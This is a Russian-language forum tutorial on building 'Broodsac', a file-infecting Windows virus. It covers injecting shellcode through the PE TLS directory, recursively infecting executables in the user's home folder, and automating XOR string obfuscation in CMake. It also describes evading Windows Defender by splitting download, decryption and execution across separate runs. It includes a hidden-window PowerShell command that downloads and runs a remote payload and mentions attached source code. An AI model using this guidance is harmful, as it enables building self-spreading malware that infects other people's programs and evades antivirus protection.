Пользователи Unix уже знакомы с этим. Одна из старейших систем сборки, GNU Make и набор инструментов autotools, является основой для обмена и сборки кода на платформах, похожих на Unix. Однако у пользователей Windows такой культуры нет. Всё это — проекты Visual Studio. И, как всегда, система сборки MSVC — настоящая чёрная коробка за IDE Visual Studio. Хакеры, которые могут управлять этой чёрной магией MSVC по своему усмотрению, безусловно, вдохновляют нас своими невероятными payload-ами. Господь знает, как бы я хотел увидеть систему сборки SmokeLoader[10].<br />
<br />
Вы можете рассматривать эту статью как кулинарный рецепт. Хотя техника вируса, используемая здесь, далеко не нова (&quot;roy g biv уже это сделал&quot;), она обёрнута в техники и лучшие практики для создания любого типа вируса. Мы рассмотрим использование надёжной системы сборки для создания нашего вируса и обсудим техники для систем сборки, которые ускоряют нашу разработку вредоносных программ.<br />
<br />
<b><u>Мы также рассмотрим некоторые техники, необходимые для обхода Windows Defender</u></b>, так как это теперь базовый уровень, против которого мы должны разрабатывать.<br />
<br />
Чтобы следовать материалу, получите копию Visual Studio с поддержкой C++, CMake (<a href="https://cmake.org/" target="_blank" class="link link--external" rel="noopener">CMake - Upgrade Your Software Build System</a>) и NASM для Windows (<a href="https://nasm.us/" target="_blank" class="link link--external" rel="noopener">NASM</a>).<br />
Для полного понимания этой статьи вам потребуется базовое понимание PE-файлов.<br />
<br />
<b>--[ 2. Планирование вируса</b><br />
<br />
Мы хотим создать заражающий исполняемые файлы вирус для Windows. Для этого нам нужно разбить на составляющие части все элементы, участвующие в заражении исполняемых файлов. Хотя традиционные вирусы для заражения исполняемых файлов устарели из-за улучшений в защите исполняемых файлов, это всё ещё возможно — особенно с появлением разработчиков, которые не могут позволить себе или не заботятся о подписании своих бинарных файлов. (Привет, Rust!)<br />
<br />
На начальном этапе у нас есть два элемента: <i>заражатель</i> и <i>инфекция</i>. Очевидно, что <i>заражатель</i> отвечает за заражение найденных исполняемых файлов. <i>Инфекция</i> — это просто любая полезная нагрузка, которую мы хотим внедрить в различные исполняемые файлы. Уже здесь у нас появляется зависимость, с которой нужно работать: естественно, <i>заражатель</i> зависит от <i>инфекции</i> в системе сборки, каким-то образом. Мы хотим, чтобы инфекция была гибкой и переносимой, чтобы её было как можно легче внедрять в исполняемые файлы. Shell-код идеально подходит для этой цели.<br />
<br />
Для написания качественного shell-кода мы придерживаемся философии C-then-ASM для написания нашей полезной нагрузки. В Broodsac (Это наш проект, который мы будем описывать в этой статье) мы решили позволить оптимизатору компилятора оптимизировать наш C-код и перевели его в assembly-файл.<br />
<br />
Хотя это может быть утомительно, чем больше становится shell-код, нам, к счастью, не нужно беспокоиться о традиционных требованиях к shell-коду при эксплуатации, поскольку мы нацелены на исполняемый файл, а не на эксплуатируемый буфер. Следовательно, у нас относительно меньше ограничений. Кроме того, поскольку Windows поддерживает как 32-битные, так и 64-битные бинарные файлы, и будучи динозавром, каким она является, 32-битная архитектура всё ещё актуальна. Поэтому потребуются полезные нагрузки для обеих архитектур.<br />
<br />
На начальном этапе нашего плана иерархия вируса выглядит следующим образом:<br />
<ul>
<li data-xf-list-type="ul">broodsac<ul>
<li data-xf-list-type="ul">infection<ul>
<li data-xf-list-type="ul">ASM<ul>
<li data-xf-list-type="ul">32</li>
<li data-xf-list-type="ul">64</li>
</ul></li>
<li data-xf-list-type="ul">C</li>
</ul></li>
</ul></li>
</ul>Инфекция — это необходимость для заражателя, и, как таковая, она должна быть размещена в его каталоге как зависимость. Мы должны предоставить себе возможность компилировать assembly-полезные нагрузки в отдельные бинарные файлы для целей тестирования. Это означает, что в абстрактном виде у нас есть примерно четыре бинарных файла для работы — заражатель, 32-битный ASM, 64-битный ASM и C payload. Наш заражатель должен полагаться только на assembly-полезные нагрузки, поэтому мы должны как-то соединить эти элементы с нашим заражателем на этапе сборки.<br />
<br />
Имея проекты, разделённые таким образом, проще управлять.<br />
<br />
Создание системы сборки для вашего вируса выявляет болевые точки в случаях, когда что-то идёт не так, позволяя вам быстро и элегантно решить проблему. Она также действует как функциональное, инженерное средство, которое связывает вашу сборку. Чем сложнее становится ваш вирус, тем более важной становится надёжная система сборки.<br />
<br />
<b>--[ 3. Проектирование вируса</b><br />
<br />
Теперь у нас есть абстрактный дизайн всех элементов нашего вируса. Далее нам нужно заполнить пробелы! У нас есть два вопроса, на которые нужно ответить:<br />
<br />
<ul>
<li data-xf-list-type="ul">Как наш вирус должен заражать исполняемый файл?</li>
<li data-xf-list-type="ul">Что должна делать наша вирусная полезная нагрузка?</li>
</ul><br />
Первый вопрос был решён сначала наивно — с помощью скрытых кодов и перенаправления точки входа PE-файла. Перенаправление точки входа — это техника, старая как инфекции EXE-файлов[1]. К сожалению, скрытые коды в исполняемых файлах редко имеют размер, достаточный для работы с гигантским shell-кодом для Windows. В среднем, это около 200 байт. Подходит для Linux shell-кода, но не для Windows.<br />
<br />
После некоторых раздумий было решено использовать внедрение в каталог TLS[2]. Каталог TLS (Thread Local Storage) — это один из многих каталогов в PE-файле. Он отвечает за управление тактиками хранения памяти потоков в данном исполняемом файле. Примечательной чертой каталога TLS являются инициализационные обратные вызовы. Их может быть много, и они вызываются поочерёдно при запуске процесса. Другими словами, каталог TLS имеет приоритет перед основной рутиной, так как инициализация каталога TLS является частью процесса загрузки PE-файла. Запомните этот последний момент — он сыграет с нами злую шутку позже.<br />
<br />
Вопрос заключается в том, как наш раздел TLS будет вставлен в бинарный файл. Мы просто выбрали вставку нового раздела, так как можем гарантировать, что раздел будет исполняемым и записываемым, в отличие от того, чтобы содержать другие метаданные, такие как ресурсы программы. Если бы мы хотели быть более скрытными в отношении инфекции, мы могли бы контролировать исполняемые разделы и применить технику 29A[3], расширив последний раздел в исполняемом файле. Естественно, компромисс в незаметности здесь будет заключаться в уменьшении потенциальной поверхности атаки и — возможно, намеренно — увеличении сложности обнаружения инфекции. Выбор за вами.<br />
<br />
Нам нужны целевые исполняемые файлы. Где мы их найдём? Удивительно, в домашнем каталоге пользователя. Прошли времена, когда каждая программа устанавливалась в каталог Program Files, теперь наступила эра AppData и папки документов пользователя, где они распаковывают различные пакеты несанкционированных исполняемых файлов. Мы можем просто рекурсивно перебирать домашний каталог пользователя в поисках целей.<br />
<br />
Что касается того, что должна делать полезная нагрузка при заражении? Я лично фанат проекта Desktop Pet[4], ранее известного как eSheep в 90-х. Это подходящая полезная нагрузка, чтобы оживить технику заражения из 90-х. Она создаёт отличное визуальное представление, если полезная нагрузка выполняется для тестирования. Наша полезная нагрузка должна просто скачать (если файл не существует) и запустить эту милую маленькую овечку на рабочем столе пользователя. Кто бы отказался от такой очаровательной программы, дополняющей исполняемые файлы милым животным-другом? Простое скачивание и запуск этой полезной нагрузки будет идеально.<br />
<br />
<b>--[ 4. Создание вируса</b><br />
<br />
Быстро и просто, чтобы собрать Broodsac, раскодируйте артефакты в разделе 9 <b><u>(Исходник я распаковал уже во вложении)</u></b>, чтобы получить архив, распакуйте его и выполните следующие команды:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>$ cd broodsac
$ mkdir build
$ cd build
$ cmake ../ -A x64
$ cmake --build ./ --config Release</code></pre>
	</div>
</div><br />
Естественно, я предполагаю, что вы не будете столь глупы, чтобы запускать результат на системе, с которой вы не хотите возиться. Если только вы <i>не хотите</i> овечек в своих исполняемых файлах, тогда вперёд.<br />
<br />
Во время создания вашего вируса вы, несомненно, столкнётесь с ошибками. Учитывая, что мы создаём программное обеспечение, мы должны заимствовать философию программного обеспечения по созданию и выполнению тестов. Это не обязательно должны быть формальные модульные тесты, где проверяется функциональность в отдельных точках кода, но они должны как-то тестировать функциональность вашего вируса. Учитывая нестабильность неопределённого поведения целей, с которыми мы работаем в нашей тёмной разработке, вы абсолютно должны думать о тестах на переднем плане.<br />
<br />
Есть три ключевых вопроса, которые нам нужно рассмотреть для целей тестирования:<br />
<br />
<ul>
<li data-xf-list-type="ul">Работает ли полезная нагрузка?</li>
<li data-xf-list-type="ul">Успешно ли заражает заражатель?</li>
<li data-xf-list-type="ul">Проходит ли инфекция, не нарушая исходного выполнения?</li>
</ul><br />
Первый вопрос имеет для нас действие: как мы это тестируем? Естественно, мы не обязаны делать это программно — нам просто нужно запустить полезную нагрузку в её различных формах, чтобы убедиться, что она успешно запускает милую овечку. Cи и Assembly имеют различные подводные камни разработки, которые станут очевидны во время этого простого процесса тестирования. Чтобы создать и протестировать наш 64-битный payload, например, мы можем просто выполнить следующие команды:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>$ cd infection/asm/64
$ mkdir build
$ cd build
$ cmake ../ -DINFECTION_STANDALONE=ON -A x64
$ cmake --build ./ --config Release
$ ./Release/infection_asm_64.exe</code></pre>
	</div>
</div><br />
Если наша полезная нагрузка сработает, мы будем вознаграждены милой овечкой. Простой тест.<br />
<br />
Это похоже на процесс configure/make в Linux. CMake берёт файл CMakeLists.txt в целевом каталоге и строит конфигурацию для ваших инструментов компиляции, необходимых для выполнения сборки. Мы настроили наши ASM-файлы так, чтобы их можно было компилировать как отдельные бинарные файлы для индивидуального тестирования, так и как статические библиотеки для включения в исполняемый файл заражателя.<br />
<br />
Была выбрана статическая библиотека как метод объединения наших payload-ов в наш бинарный файл, потому что это просто и элегантно, так как архитектура полезной нагрузки будет совпадать. Инстинктивно, мы видим shell-код как единицу, которую нужно сохранить, перевести в шестнадцатеричную строку и спрятать в каком-то C-коде. Поэтому мы делаем с ним креативные вещи, считая его просто блобом данных, который нужно как-то преобразовать. Мы склонны забывать, что shell-код может быть своей собственной индивидуальной единицей кода.<br />
<br />
Но с системой сборки на вашей стороне, вы можете дополнить способ выхода вашего shell-кода на этапе компиляции. После различных кастомизаций сборки нашего payload-а в файле CMake заражающего исполняемого файла, мы включаем этот и 32-битную версию следующим образом:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>add_subdirectory(${PROJECT_SOURCE_DIR}/infection/asm/32)
add_subdirectory(${PROJECT_SOURCE_DIR}/infection/asm/64)

add_executable(broodsac WIN32 main.c)
target_link_libraries(broodsac infection_asm_32 infection_asm_64)</code></pre>
	</div>
</div><br />
Таким образом, в довольно чистом виде, с простым набором ключевых слов &quot;extern&quot; в файле main.c заражателя, мы включили наши shell-коды в основной бинарный файл. Хотя это ещё не показано, помимо этого процесса, мы также автоматизировали этап шифрования строк внутри кода полезной нагрузки, так что каждый раз, когда выполняется наша сборка, строки перешифровываются и пересобираются в исполняемом файле заражателя.<br />
<br />
Мы избежали утомительной задачи по ручному преобразованию нашего shell-кода в массив какого-то рода и даже добавили шаг обфускации по пути. Прелесть этого метода в том, что он избегает скрытых опасностей, которые часто возникают из-за быстрых решений, к которым мы привыкли. И в конце концов: это просто хорошая практика разработки программного обеспечения.<br />
<br />
Вернёмся к нашим вопросам. Остальные вопросы, хотя и имеют ту же задачу, имеют более сложный ответ. Нам нужно протестировать и проанализировать заражённые исполняемые файлы, чтобы проверить и отладить инфекции. Поэтому нам нужно перечислить, что нужно тестировать, исходя из нашего проектного замысла.<br />
<br />
Поскольку мы работаем с каталогом TLS, мы в основном имеем дело с <i>виртуальными адресами</i>, в отличие от RVA и смещений. Виртуальные адреса обычно подразумевают необходимость обработки перекомпоновок внутри бинарного файла. Это абсолютно то, с чем нам нужно разобраться как заражающему исполняемому файлу — с повсеместным использованием Address Space Layout Randomization (aka /DYNAMICBASE), было бы глупо не рассматривать возможность изменения каталога перекомпоновок целевого исполняемого файла в случае заражения.<br />
<br />
Таким образом, у нас есть четыре состояния конфигурации, чтобы протестировать заражение:<br />
<br />
<ul>
<li data-xf-list-type="ul">нет каталога tls, нет каталога перекомпоновок</li>
<li data-xf-list-type="ul">нет каталога tls, каталог перекомпоновок присутствует</li>
<li data-xf-list-type="ul">каталог tls присутствует, нет каталога перекомпоновок</li>
<li data-xf-list-type="ul">каталог tls присутствует, каталог перекомпоновок присутствует</li>
</ul><br />
Кроме того, нам нужно учитывать целевую 32-битную архитектуру, создавая в общей сложности 8 конфигураций бинарных файлов для тестирования! Это увеличивает общее количество кодовых проектов в нашем вирусном проекте до 12. С хорошей системой сборки мы можем довольно легко собрать все эти тестовые бинарные файлы:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>$ cd infectables
$ mkdir build32 build64
$ cd build32
$ cmake ../ -A Win32
$ cd ../build64
$ cmake ../ -A x64</code></pre>
	</div>
</div><br />
Скрипты сборки могут в основном следовать иерархии папок и собирать несколько проектов, содержащихся внутри, что здесь и происходит. Теперь у нас есть две настроенные среды сборки — одна для 32-битной, и одна для 64-битной архитектуры.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>$ cd build32
$ cmake --build ./ --config Release
$ cd ../build64
$ cmake --build ./ --config Release</code></pre>
	</div>
</div><br />
Это поместит все бинарные файлы в каталог Release внутри среды сборки. Они затем могут быть целью для заражения нашим исполняемым файлом заражателя в целях тестирования. Как и компилятор на командной строке, мы можем настроить различные переключатели для определения заголовков CMake. Мы можем настроить наш заражатель, чтобы он был осведомлён о каталоге, содержащем наши исполняемые файлы для заражения:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>$ mkdir build
$ cd build
$ cmake -DBROODSAC_DEBUG=ON -DBROODSAC_INFECTABLES=&quot;infectables&quot; \
  -A x64 ../</code></pre>
	</div>
</div><br />
Эта команда эффективно собирает Broodsac в режиме отладки. Вместо того чтобы нацеливаться на домашний каталог пользователя, он будет нацелен на каталог с заражаемыми файлами, где в данный момент собраны наши тестовые программы. Запустив Broodsac в этом состоянии, мы сможем легко проверить состояние заражения и соответствующей полезной нагрузки. И это чрезвычайно важно — самые опасные демоны скрываются глубже всего. Надежное тестирование поможет их искоренить.<br />
<br />
<b>--[ 5. Работа с проблемами разработки</b><br />
<br />
Результат вируса, который вы видите здесь, — это труд любви, многие часы, проведенные за отладкой, тестированием, проверкой, исправлением и рефакторингом. Но когда вы видите конечный продукт, вы не видите тех мелких шагов, которые в конечном итоге привели к созданию этого продукта. Поэтому трудно оценить борьбу, с которой сталкиваются разработчики программного обеспечения. Это, в основном, индивидуальное путешествие, на которое отправляется каждый, кто пишет код.<br />
<br />
Очень легко смеяться над хорошей, ужасной ошибкой. Нас удивляет, когда глупые ошибки, кажется, живут долго, просто ожидая, когда их обнаружит следующий счастливый участник. Но ошибки — это часть жизненного цикла программного обеспечения, независимо от того, эксплуатируемы они или нет.<br />
<br />
Этот раздел сосредоточен на двух ключевых моментах критических сбоев в процессе разработки этого вируса: моменте, когда первоначальная идея полезной нагрузки провалилась в последний момент, и моменте, когда антивирус начал обнаруживать наши инфекции.<br />
<br />
<b>--[ 5.1 Первоначальный дизайн проваливается</b><br />
<br />
Вы помните, когда я сказал, что каталог TLS вернется, чтобы укусить нас за зад? Как же нам помогла надёжная система сборки?<br />
<br />
Изначально наша полезная нагрузка была очень простой, логичной программой: импортировать GetFileAttributes, URLDownloadToFileA и ShellExecuteA. Это было бы всё, что нам нужно, чтобы загрузить нашу овечку и запустить её на целевой системе. Чтобы объяснить хаос, который мы смягчили, давайте разберем шаги, необходимые для генерации и тестирования нашей окончательной полезной нагрузки, заражателя:<br />
<ol>
<li data-xf-list-type="ol">Скомпилировать C-инфекцию</li>
<li data-xf-list-type="ol">Протестировать C-инфекцию</li>
<li data-xf-list-type="ol">Перевести в assembly на 32-битных и 64-битных архитектурах</li>
<li data-xf-list-type="ol">Скомпилировать assembly (2x)</li>
<li data-xf-list-type="ol">Протестировать assembly (2x)</li>
<li data-xf-list-type="ol">Включить shell-код в наш заражатель</li>
<li data-xf-list-type="ol">Скомпилировать заражатель</li>
<li data-xf-list-type="ol">Протестировать заражатель</li>
<li data-xf-list-type="ol">Убедиться, что инфекции успешны</li>
</ol>Когда мы полностью перечисляем шаги, необходимые для создания качественного вируса, мы можем оценить, как система сборки упрощает сложную экосистему. Потому что на любом этапе этого процесса что-то может пойти не так. В любой момент процесса, если <i>что-то</i> идет не так, нам придется начать заново с определенного этапа. Чем больше времени требуется на возобновление работы после сбоя, тем больше времени теряется. И если с организационной точки зрения неясно, куда нужно идти, чтобы перезапустить процесс, это напрасная трата времени. Хорошая система сборки экономит время, этот очень ценный ресурс.<br />
<br />
В данном случае было обнаружено, что ShellExecuteA и URLDownloadToFileA не сработали на этапе 9. Зад укушен. И посмотрите, когда он выбрал момент, чтобы нас укусить — во время тестирования, а не развертывания. Почему нас укусило? Из-за нашей техники инфекции через внедрение в TLS.<br />
<br />
Из-за выбора внедрения в TLS в бинарном файле мы были соблазнены тем, что получили приоритет над точкой входа зараженного исполняемого файла. Но это означает, что в данный момент мы выполняемся в контексте загрузчика исполняемого файла. Это означает, что наш зараженный исполняемый файл ещё не полностью загружен. В частности, в нашем случае <i>потоки</i> еще не полностью инициализированы. Было замечено, что когда ShellExecuteA и URLDownloadToFileA выполнялись в контексте обратного вызова каталога TLS, они зависали. Также было отмечено, что процесс попытался создать поток перед зависанием. Это, вероятно, означало, что мы не могли использовать никакие функции, которые создавали потоки.<br />
<br />
Полезная нагрузка была изменена на нечто чуть менее стандартное: CreateProcessA. Хотя это и не необычно для нашей программы полезной нагрузки, то, как мы в конечном итоге скачивали полезную нагрузку, определенно было необычным. CreateProcessA в конечном итоге вызывает NtCreateProcess, функцию ntdll.dll, которая, в конечном итоге, завершает системный вызов ядра. Это, несомненно, будет безопасно для потоков в нашем каталоге TLS. Так как же мы в конечном итоге загрузили нашу полезную нагрузку? Вызовом Powershell.<br />
<br />
Конечно, это забавно, когда shell-код делает внешний вызов к Powershell, когда API находится у вас под рукой, не так ли? Такова природа хакерства — столкнувшись с вызовом, мы откликаемся нестандартными решениями, несмотря на наши мнения, если это просто работает.<br />
<br />
Тем не менее, это решение потребовало значительной переработки кода. C-полезная нагрузка должна быть переписана, перекомпилирована, переведена в assembly, эти assembly-файлы скомпилированы и вставлены обратно в наш заражатель. По сути, мы вынуждены вернуться к началу наших перечисленных шагов и проделать путь назад к нашему заражателю. Это много времени, и ещё больше шагов, которые нужно пройти без упрощения, которое предоставляет система сборки!<br />
<br />
Но когда всё связано вместе, единственное время, которое мы тратим, — это просто эквивалент граблей в нашем дзен-саду: программирование и анализ. Всё потому, что наша система сборки делает наши сложные абстрактные шаги проверки относительно простыми:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>$ cd infection/c/build
$ cmake --build ./
$ ./Debug/infection_c.exe # есть овечки? попробуйте снова
$ cmake --build ./ --config Release # для перевода в asm
$ cd ../../asm/32/build
$ cmake --build ./
$ ./Debug/infection_asm_32.exe # есть овечки? попробуйте снова
$ cd ../../64/build
$ cmake --build ./
$ ./Debug/infection_asm_64.exe # есть овечки? попробуйте снова
$ cd ../../../../build # проверка: настроен ли Debug?
$ cmake --build ./
$ ./Debug/broodsac.exe # по крайней мере, если ошибка, вы просто получите овечек</code></pre>
	</div>
</div><br />
Каждый шаг, где что-то может пойти не так, изолирован в своё место, управляемое по-своему. Каждое действие, необходимое для создания нашего вируса, от полезной нагрузки до доставки, инструментируется и плавно переходит друг в друга. Когда что-то идёт не так на любом этапе этой цепочки, мы точно знаем, где начать заново, и можем быстро действовать и решать проблему.<br />
<br />
Быть гибким, когда дело доходит до устранения демонов багов, это одно, но что насчёт демонов экстренных запросов на функции? Это не просто давление со стороны руководства вызывает такие скачки в разработке, но и неожиданная необходимость.<br />
<br />
<b>--[ 5.2 Антивирус ловит вирус</b><br />
<br />
Меня очень развеселило, когда я заметил, что овечка определяется как вредоносное ПО. Любопытно, ведь сама овечка технически была безобидной — заражатель и инфекция были фактическим вредоносным ПО. Изначально я добавил её в белый список в Windows Defender, пока работал, и особо не задумывался об этом, я исправлю это позже. В конце концов, мне пришлось столкнуться с реальностью и понять, почему мой вирус был обнаружен, даже если овечка, на удивление, была безобидной.<br />
<br />
Подсказки, которые мы получали от Windows Defender, указывали на то, что это какой-то скрипт, который его срабатывает, и что сигнатура, на которую он наталкивается, называется &quot;Trojan-Script/Wacatac.B!ml.&quot; Исследование этой сигнатуры ничего нам не дало, как это часто бывает с автоматически сгенерированными сигнатурами. Мы узнали только, что все раздражены тем, что все виды случайных безобидных исполняемых файлов помечаются как Wacatac. Нас подвела ложная сработка? Положительно неловко.<br />
<br />
В любом случае, стало ясно, что с учётом подсказки о скрипте, срабатывание происходило из-за нашего однострочника Powershell. Я даже не пытался каким-либо образом обфусцировать команду, так что неудивительно, что её в конце концов поймали. Мы позже подтвердили благодаря некоторым исследованиям сигнатур Windows Defender[5], что наша строка загрузки была абсолютно там, где-то, так что это явно был виновник. Это означает, что теперь нам нужно было её обфусцировать.<br />
<br />
Конечно, мы могли бы сделать это раз и навсегда и закодировать её прямо в assembly-файлы, но где в этом веселье? Они просто пометят зашифрованный блок и успокоятся! Где в этом гибкость? И что, если мне нужно будет полностью изменить конечную команду? Как я могу сделать это как можно менее болезненным для себя и других, кто захочет преобразовать этот код?<br />
<br />
Прелесть хорошей системы сборки заключается в возможности скромно передать команды сборки другому процессу на определенных этапах сборки. Давайте посмотрим на код в наших полезных нагрузках, который шифрует строки:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>add_custom_command(TARGET infection_asm_64
  PRE_BUILD
  COMMAND powershell ARGS
  -ExecutionPolicy bypass
  -File &quot;${CMAKE_CURRENT_SOURCE_DIR}/../strings.ps1&quot;
  -payload_program &quot;\\??\\C:\\ProgramData\\sheep.exe&quot;
  -payload_command &quot;sheep&quot;
  -download_program &quot;\\??\\C:\\Windows\\System32\\WindowsPowerShell\
\\v1.0\\powershell.exe&quot;
  -download_command &quot;powershell -ExecutionPolicy bypass \
-WindowStyle hidden \
-Command \&quot;(New-Object System.Net.WebClient).DownloadFile(\
&#039;https://amethyst.systems/sheep.dat&#039;, &#039;C:\\ProgramData\\sheep.exe&#039;)\&quot;&quot;
  -output &quot;${CMAKE_CURRENT_BINARY_DIR}/$&lt;CONFIG&gt;/infection_strings.asm&quot;
  VERBATIM)</code></pre>
	</div>
</div><br />
Powershell был выбран просто потому, что с ним проще работать, чем со старым CMD. Был создан простой скрипт, который преобразовывал многие строки, которые нам нужно было зашифровать, выбирал случайный ключ, а затем выполнял традиционное XOR-шифрование строки. Скрипт создаёт файл включения NASM и сохраняет его в каталоге бинарных файлов системы сборки — по сути, универсальный каталог для любых созданных артефактов. Мы затем включаем этот каталог в директивы ассемблера, чтобы наши assembly-файлы могли его видеть:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>target_include_directories(infection_asm_64 PUBLIC
  &quot;${CMAKE_CURRENT_SOURCE_DIR}&quot;
  &quot;${CMAKE_CURRENT_BINARY_DIR}/$&lt;CONFIG&gt;&quot;)</code></pre>
	</div>
</div><br />
Как творцы, чей холст — сомнительный машинный код, мы, без сомнения, можем увидеть привлекательность и возможности, которые это даёт. Если вы действительно чувствуете себя дерзко, вы даже можете мутировать объекты COFF и включать их в определенные конфигурации библиотек через CMake! Изменение объектов напрямую будет выглядеть примерно так:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>add_library(obfuscateme STATIC obfu.c)
add_custom_command(TARGET obfuscateme
PRE_LINK COMMAND obfuscate ARGS
&quot;${CMAKE_CURRENT_BINARY_DIR}/obfuscateme.dir/$&lt;CONFIG&gt;/obfu.obj&quot;)
add_executable(virus main.c)
target_link_libraries(virus obfuscateme)</code></pre>
	</div>
</div><br />
Эти простые четыре строки компилируют набор функций, которые нужно обфусцировать, вызывают обфускатор для нашего скомпилированного объектного файла, который затем снова включается в процесс сборки на этапе линковки, а затем добавляют обфусцированный код в качестве зависимости библиотеки основного вируса. Каждый раз, когда цель вируса вызывается для компиляции, функциональность будет обфусцирована и автоматически включена в наш код. По сути, если вы можете вызвать внешнюю команду для генерации чего-либо как часть процесса сборки, возможности интеграции в вашу программу практически не ограничены.<br />
<br />
Несмотря на то, что возможности этих функций кажутся весьма интересными, наша попытка скрыть сигнатуры, на которые, как мы думали, мы попадали, оказалась недостаточной. Видите ли, как показывает исследование сигнатур Defender[5], существует несколько типов сигнатур, с которыми приходится иметь дело, и, согласно DefenderCheck[6] и чуть более продвинутому ThreatCheck[7], я не наталкивался на статические сигнатуры. Действительно, копание в недрах базы данных сигнатур обнаруженных угроз оказалось относительно бесплодным в поисках подсказок о том, как их обойти — существовал алгоритм статической сигнатуры, который был не совсем ясен по поводу того, как он сканируется, и, что более важно, нечто под названием &quot;NID.&quot;<br />
<br />
NID в данном случае, по-видимому, идентифицирует что-то внутри Network Realtime Inspection Service.[8] Вероятно, это какая-то метаданные о конкретном поведении. Это означает, что наши сигнатуры, вероятно, срабатывали на поведенческую сигнатуру! Как мы могли бы это обойти?<br />
<br />
Наивно, не сталкиваясь с этим ранее, мы бросили на стену кучу случайных решений, чтобы увидеть, что сработает. Hell&#039;s Gate? Сервис Network Realtime Inspection не был EDR, так что, естественно, это не сработало. Не говоря уже о том, что с уникальной позицией Microsoft на ландшафте Windows (они являются хозяевами подземелья), попытки обойти EDR просто недостаточны. Но ради полноты потенциальных уклонений это было оставлено в полезной нагрузке Broodsac. (Реализация Hell&#039;s Gate состоит из прямых системных вызовов, а не косвенных, так что над этим ещё предстоит поработать.)<br />
<br />
По сути, поведенческая сигнатура полагается на цепочку определённых действий, чтобы объявить что-то потенциально вредоносным. Давайте рассмотрим, что, по сути, делает наша полезная нагрузка, что могло бы быть отмечено как потенциально вредоносное:<br />
<br />
<ul>
<li data-xf-list-type="ul">загрузка исполняемого файла</li>
<li data-xf-list-type="ul">возможно, дешифровка исполняемого файла</li>
<li data-xf-list-type="ul">выполнение исполняемого файла</li>
</ul><br />
Честно говоря, я не вижу в этом ничего плохого, но, видимо, Microsoft не согласен!<br />
<br />
Забавная особенность поведенческого анализа заключается в том, что он полагается на идентификацию поведения в данном контексте выполнения, а не на сумму его выполнений. Чтобы поведенческий анализ был успешным, негативные действия, которые происходят в комбинации, должны происходить в одном и том же контексте выполнения.<br />
<br />
<b><u>Если мы разделим три вышеупомянутые задачи на три отдельных контекста выполнения — загрузка, дешифровка и выполнение — будет ли это достаточно, чтобы обойти поведенческое обнаружение?</u></b><br />
<br />
Да! Хотя я не проводил обратную разработку NisSrv.exe, чтобы понять, почему мне удалось обойти защиту, теория о разделении задач между контекстами выполнения оказалась успешной в обходе Defender.<br />
<br />
Таким образом, полезная нагрузка эволюционировала в интересную многоэтапную полезную нагрузку. Пользователю придется запускать зараженный исполняемый файл несколько раз, прежде чем появится овечка. Это также принесло дополнительное преимущество в плане скрытности. Откуда берётся овечка? Почему это происходит каждый раз, когда я запускаю эту программу? Загадка! Но мило. Таким образом, Broodsac оправдывает своё название многослойного червя, в честь которого он был назван, зелёно-полосатого бродсака.[9]<br />
<br />
Наш дзен-сад ухожен и готов для того, чтобы им поделились, чтобы другие могли медитировать и размышлять о своих собственных садах. Для этой медитации различные кодовые объекты, содержащиеся в архиве, прилагаемом к этой статье, были аннотированы комментариями, объясняющими отдельные области кода и их назначение. Естественно, сложность динозавра, которым является формат PE, сопровождается раздражающими, отвратительными трюками и привычками, из-за которых в первую очередь стыдно за свой код. Прошу прощения от имени Марка Збиковски.<br />
<br />
